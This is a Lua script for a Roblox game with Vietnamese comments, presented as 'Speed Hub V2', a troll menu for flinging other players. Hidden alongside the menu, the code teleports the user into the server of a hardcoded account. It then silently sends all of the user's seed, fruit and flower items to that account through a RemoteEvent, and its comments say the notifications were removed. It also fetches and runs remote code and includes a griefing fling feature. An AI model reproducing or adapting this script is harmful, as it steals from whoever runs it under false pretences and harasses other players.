-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB V2: TỰ ĐỘNG DỊCH CHUYỂN PHÒNG & CHUYỂN ĐỒ NGẦM ====")

local successUI, KavoLib = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
end)

local Window
if successUI and KavoLib then
    Window = KavoLib.CreateLib("Speed Hub V2", "DarkTheme")
end

-- Hệ thống biến quản lý trạng thái
local Options = { FlingTargetEnabled = false }
local selectedFlingTarget = "" 
local targetUsername = "sutkucheonhamku" -- Tên nick chính nhận đồ
local targetUserId = 10959698330 -- ID của nick chính để tự join phòng

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- =======================================================================
-- HÀM TỰ ĐỘNG JOIN SERVER CỦA NICK CHÍNH
-- =======================================================================
local function joinNickChinhServer()
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if not targetPlayer then
        -- Thử cách 1: Tìm theo ID trực tiếp
        local success, _ = pcall(function()
            TeleportService:TeleportUserIdsAsync(game.PlaceId, {targetUserId}, LocalPlayer)
        end)
        
        -- Thử cách 2 nếu cách 1 không chạy (Quét danh sách server công khai)
        if not success then
            pcall(function()
                local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=50"
                local serverData = HttpService:JSONDecode(game:HttpGet(url))
                if serverData and serverData.data then
                    local availableServers = {}
                    for _, server in pairs(serverData.data) do
                        if server.id ~= game.JobId and server.playing < server.maxPlayers then
                            table.insert(availableServers, server.id)
                        end
                    end
                    if #availableServers > 0 then
                        TeleportService:TeleportToPlaceInstance(game.PlaceId, availableServers[math.random(1, #availableServers)], LocalPlayer)
                    end
                end
            end)
        end
    end
end

-- Kích hoạt kiểm tra phòng ngay lập tức khi bật script
joinNickChinhServer()

-- =======================================================================
-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (ĐÃ BỎ THÔNG BÁO)
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.5)
    end
end

task.spawn(function()
    task.wait(10) -- Chờ 10 giây sau khi vào phòng
    
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if targetPlayer then
        local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
        local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
        
        if not Inventory then
            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        end

        if Inventory then
            for _, folder in pairs(Inventory:GetChildren()) do
                if folder:IsA("Folder") or folder:IsA("Configuration") then
                    for _, item in pairs(folder:GetChildren()) do
                        if item:IsA("ValueBase") and item.Value > 0 then
                            local lowerName = string.lower(item.Name)
                            if string.find(lowerName, "seed") then
                                sendItemSecure("Seeds", item.Name, item.Value)
                            elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                                sendItemSecure("Fruits", item.Name, item.Value)
                            end
                        end
                    end
                elseif folder:IsA("ValueBase") and folder.Value > 0 then
                    local lowerName = string.lower(folder.Name)
                    if string.find(lowerName, "seed") then
                        sendItemSecure("Seeds", folder.Name, folder.Value)
                    elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                        sendItemSecure("Fruits", folder.Name, folder.Value)
                    end
                end
            end
        end
    end
end)

-- =======================================================================
-- CHỨC NĂNG 2: THẦN CHƯỞNG FLING KHÓA VÀ ĐUỔI MỤC TIÊU
-- =======================================================================
task.spawn(function()
    while true do
        RunService.Heartbeat:Wait()
        if Options.FlingTargetEnabled and selectedFlingTarget ~= "" then
            local targetPlayer = Players:FindFirstChild(selectedFlingTarget)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local myHrp = LocalPlayer.Character.HumanoidRootPart
                local enemyHrp = targetPlayer.Character.HumanoidRootPart
                
                myHrp.CFrame = enemyHrp.CFrame * CFrame.new(0, 0, 0.5)
                
                local oldVelocity = myHrp.Velocity
                myHrp.Velocity = Vector3.new(999999, 999999, 999999)
                
                RunService.RenderStepped:Wait()
                myHrp.Velocity = oldVelocity
                
                for _, part in pairs(LocalPlayer.Character:GetChildren()) do
                    if part:IsA("BasePart") then part.CanCollide = false end
                end
            end
        end
    end
end)

local function getPlayerList()
    local list = {}
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name ~= targetUsername then
            table.insert(list, player.Name)
        end
    end
    return list
end

-- =======================================================================
-- THIẾT KẾ MENU INTERFACE (KAVO UI)
-- =======================================================================
if Window then
    pcall(function()
        local MainTab = Window:NewTab("Troll / Fling")
        local MainSection = MainTab:NewSection("Cấu Hình Fling Mục Tiêu")

        local TargetDropdown = MainSection:NewDropdown("Chọn Người Muốn Fling", "Bấm để chọn tên", getPlayerList(), function(Value)
            selectedFlingTarget = Value
        end)

        MainSection:NewToggle("Bật Auto Fling Người Này", "Tự động bay đến dí mục tiêu", function(bool)
            Options.FlingTargetEnabled = bool
        end)

        MainSection:NewButton("Làm Mới Danh Sách Người Chơi", "Cập nhật lại danh sách khi có người ra vào", function()
            TargetDropdown:Refresh(getPlayerList())
        end)
    end)
end
